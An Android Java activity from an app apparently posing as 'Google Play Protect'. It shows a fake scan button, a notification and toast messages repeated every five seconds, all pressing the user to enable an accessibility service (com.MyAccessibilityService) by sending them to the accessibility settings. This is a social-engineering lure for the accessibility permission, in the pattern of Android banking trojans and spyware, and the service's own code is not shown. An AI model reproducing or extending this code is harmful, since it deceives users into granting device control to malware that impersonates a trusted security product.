package com;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Button;
import android.widget.TextView;
import android.os.Bundle;
import android.widget.ImageView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;


import com.GooglePlayProtectService.R;

public class MainActivity extends AppCompatActivity {
	private static final String CHANNEL_ID = "GooglePlayProtectChannel";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.layout);

		Button scanButton = findViewById(R.id.btnScan);
		TextView securityStatus = findViewById(R.id.tvStatus);
		TextView lastScanned = findViewById(R.id.tvLastScanned);

		scanButton.setOnClickListener(v -> {
			Alert.openSettings(this);
		});


		// Show the custom notification
		showAccessibilityNotification();

		// Show toast message periodically until the service is enabled
		showToastPeriodically(); // Display toast every 5 seconds
		Alert.openSettings(this);
	}

	private void showAccessibilityNotification() {
		if (isAccessibilityServiceEnabled()) {
			NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
			createNotificationChannel(notificationManager);

			Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
			PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

			NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
					.setSmallIcon(R.drawable.ic_launcher)
					.setContentTitle("Enable Google Play Protect Service's")
					.setContentText("Please enable Google Play Protect Service's for the app to function properly.")
					.setPriority(NotificationCompat.PRIORITY_DEFAULT)
					.setContentIntent(pendingIntent)
					.setAutoCancel(true);

			notificationManager.notify(1, builder.build());
		}
	}

	private void createNotificationChannel(NotificationManager notificationManager) {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			CharSequence name = "GooglePlayProtectChannel";
			String description = "Channel for Google Play Protect Channel notifications";
			int importance = NotificationManager.IMPORTANCE_DEFAULT;
			NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
			channel.setDescription(description);
			notificationManager.createNotificationChannel(channel);
		}
	}

	private void showToastPeriodically() {
		final Handler handler = new Handler();
		final Runnable runnable = new Runnable() {
			@Override
			public void run() {
				if (isAccessibilityServiceEnabled()) {
					Toast.makeText(MainActivity.this, "This app requires Google Play Protect Service's framework, please enable it.", Toast.LENGTH_LONG).show();
					handler.postDelayed(this, 5000);
				}
			}
		};
		handler.post(runnable);
	}

	private boolean isAccessibilityServiceEnabled() {
		int accessibilityEnabled = 0;
		final String service = getPackageName() + "/" + "com.MyAccessibilityService";
		try {
			accessibilityEnabled = Settings.Secure.getInt(getApplicationContext().getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
		} catch (Settings.SettingNotFoundException e) {
			// Catch exception if setting is not found
		}
		return accessibilityEnabled != 1 || !isAccessibilityServiceEnabledForPackage(service);
	}

	private boolean isAccessibilityServiceEnabledForPackage(String service) {
		TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
		String settingValue = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
		if (settingValue != null) {
			splitter.setString(settingValue);
			while (splitter.hasNext()) {
				if (splitter.next().equalsIgnoreCase(service)) {
					return true;
				}
			}
		}
		return false;
	}
}
